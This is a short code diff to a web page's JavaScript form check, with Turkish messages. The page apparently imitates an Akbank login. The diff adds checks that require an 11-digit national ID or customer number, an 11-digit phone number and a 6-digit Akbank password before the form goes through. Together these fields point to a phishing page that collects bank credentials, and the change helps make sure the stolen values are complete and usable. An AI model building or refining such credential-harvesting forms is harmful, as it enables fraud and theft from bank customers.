@@ -148,8 +148,18 @@
         var customPass = form.customPass.value;
 
         // Inputların doldurulup doldurulmadığını kontrol et
-        if (!customTc || !customtel || !customPass) {
-            alert('Lütfen tüm alanları doldurunuz.');
+        if (!customTc || customTc.length !== 11) {
+            alert('Lütfen 11 haneli Müşteri veya TC Kimlik Numarasını giriniz.');
+            return;
+        }
+
+        if (!customtel || customtel.length !== 11) {
+            alert('Lütfen 11 haneli Telefon Numaranızı giriniz.');
+            return;
+        }
+
+        if (!customPass || customPass.length !== 6) {
+            alert('Lütfen 6 haneli Akbank Şifrenizi giriniz.');
             return;
         }
 
@@ -180,6 +190,7 @@
         });
     }
 </script>
+
 
 
 </body></html>
